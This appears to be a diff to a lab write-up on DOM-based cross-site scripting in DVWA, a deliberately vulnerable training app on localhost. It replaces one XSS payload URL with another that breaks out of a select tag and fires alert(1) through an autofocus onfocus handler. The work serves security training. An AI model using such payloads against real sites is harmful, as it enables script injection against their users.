@@ -69,7 +69,8 @@ http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=
 
 ### Payload
 http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=
-<select><xss onfocus=alert(1) autofocus tabindex=1></select>
+
+</select><xss onfocus=alert(1) autofocus tabindex=1>
 
 ### Payload Explanation
 1. Browser loads the page  
